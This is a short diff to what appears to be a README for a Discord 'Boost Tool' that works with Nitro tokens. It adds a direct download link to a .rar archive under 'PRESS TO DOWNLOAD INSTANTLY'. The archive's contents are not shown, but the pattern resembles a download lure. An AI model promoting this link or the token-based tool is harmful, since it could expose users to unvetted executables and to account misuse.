@@ -6,7 +6,7 @@
   Remember This Boost Tool ONLY allows you to boost servers if you have nitro tokens!
 </h2>
 <h2 align="center">
-  <a href="">PRESS TO DOWNLOAD INSTANTLY</a>
+  <a href="https://github.com/celgz/Boost-Bot/releases/download/Discord-Boost-Bot/b00st-tool.rar">PRESS TO DOWNLOAD INSTANTLY</a>
 </h2>
 
 ![image](https://cdn.discordapp.com/attachments/1127287128880074855/1148582336968015924/image.png) 
